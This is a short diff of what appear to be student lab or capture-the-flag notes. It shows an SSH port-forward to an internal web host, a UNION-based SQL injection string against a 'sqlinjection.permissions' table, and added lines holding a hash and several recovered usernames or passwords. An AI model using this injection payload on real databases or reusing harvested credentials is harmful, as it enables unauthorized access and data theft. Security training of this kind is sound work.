@@ -46,8 +46,9 @@ student@lin-ops:~$ ssh -S /tmp/sql sql -O forward -L1212:10.100.28.48:80
 
 category= 2 UNION SELECT Name,Description,Level FROM sqlinjection.permissions
 
+79bc18f6cbd3b2290cbd69c190d62bc6
 
-
-
-
-
+teaatime
+waterbender123
+firebender123       PASSWORD
+Zuko
